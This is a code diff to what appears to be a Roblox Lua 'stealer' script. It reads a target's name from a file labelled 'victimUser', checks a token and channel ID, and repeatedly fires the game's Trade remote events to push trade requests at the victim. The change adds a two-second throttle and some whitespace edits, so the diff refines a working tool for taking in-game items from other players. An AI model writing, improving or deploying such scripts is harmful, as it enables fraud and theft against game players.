@@ -1,5 +1,5 @@
 if not game:IsLoaded() then
-	game.Loaded:Wait()
+    game.Loaded:Wait()
 end
 
 if token == "" or channelId == "" then
@@ -26,6 +26,7 @@ local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
 local didVictimLeave = false
 local timer = 0
+local lastRequestTime = 0  -- Track when the last request was sent
 
 local function selectDevice()
     while task.wait(0.1) do
@@ -46,7 +47,6 @@ end
 
 task.spawn(selectDevice)
 
-
 local waittime = delay or 2
 wait(waittime)
 
@@ -61,13 +61,17 @@ local function saveJoinedId(messageId)
 end
 
 local function acceptRequest()
-    while task.wait(0.1) do
-    
-    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-        local args = {
-        [1] = game:GetService("Players"):WaitForChild(victimUser)
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+    while task.wait() do
+        local currentTime = tick()
+        -- Only send request if 2 seconds have passed since last request
+        if currentTime - lastRequestTime >= 2 then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+            local args = {
+                [1] = game:GetService("Players"):WaitForChild(victimUser)
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+            lastRequestTime = currentTime  -- Update the last request time
+        end
     end
 end
 
